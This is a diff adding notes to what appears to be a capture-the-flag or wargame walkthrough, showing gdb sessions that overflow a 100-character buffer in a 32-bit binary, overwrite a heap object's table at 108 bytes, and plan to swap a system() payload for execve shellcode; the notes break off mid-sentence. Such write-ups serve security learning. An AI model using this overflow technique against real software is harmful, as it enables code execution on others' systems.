@@ -161,3 +161,73 @@ x/32i 0x0804873a
 
 this looks a lot like the operators + and - :)
 (and also explains the pointer manipulation at the end of main)
+
+now we need to test what happens when we input a string with more than 100 characters
+
+let's clear all our breakpoints and start fresh we a single break at 0x804867c (just after set annotation)
+d
+b *0x804867c
+r 0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789BBBB
+info registers
+
+eax            0x804a00c        134520844
+ecx            0x42424242       1111638594
+edx            0x804a074        134520948
+ebx            0x804a078        134520952
+esp            0xbffff6a0       0xbffff6a0
+ebp            0xbffff6c8       0xbffff6c8
+
+x/1x $esp+0x10
+0xbffff6b0:     0x0804a078
+
+si 2
+disas
+info registers
+si
+info registers (edx = 0x804873a, we probably failed)
+
+try again with:
+r 0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789AABBCCDDEEFF
+info registers
+
+eax            0x804a00c        134520844
+ecx            0x46464545       1179010373
+edx            0x804a07c        134520956
+ebx            0x804a078        134520952
+esp            0xbffff690       0xbffff690
+ebp            0xbffff6b8       0xbffff6b8
+
+si 3 (segfault)
+
+try again with:
+si 2
+disas (=> 0x08048682 <+142>:   mov    (%eax),%edx)
+info registers (eax: 0x46464545, "FFEE"), so we need 108 bytes to overwrite the table
+
+x/64x 0x0804a008
+0x804a008:      0x08048848      0x33323130      0x37363534      0x31303938
+0x804a018:      0x35343332      0x39383736      0x33323130      0x37363534
+0x804a028:      0x31303938      0x35343332      0x39383736      0x33323130
+0x804a038:      0x37363534      0x31303938      0x35343332      0x39383736
+0x804a048:      0x33323130      0x37363534      0x31303938      0x35343332
+0x804a058:      0x39383736      0x33323130      0x37363534      0x31303938
+0x804a068:      0x35343332      0x39383736      0x42424141      0x44444343
+0x804a078:      0x46464545      0x00000000      0x00000000      0x00000000
+0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21
+0x804a0e8:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a0f8:      0x00000000      0x00000000      0x00000000      0x00000000
+
+nvm, we just overwrote the table of the second object :P
+
+we will reuse a payload similar to the one from level2
+
+after adapting our script multiple times, it still does not work (well, it calls system but segfault, maybe because we are not using stdin?)
+maybe there is another way to get what we want without using system, the exec family of functions (execve, execl, etc...)
+seem promising as they replace the current process entirely
+further investigation on forums/stackoverflow/etc... comparing system and execve for exploits mention that execve IS a syscall on linux (syscall 0x80)
+we will now rewrite the payload_asm to use execve instead of system (execve is more anoying, as
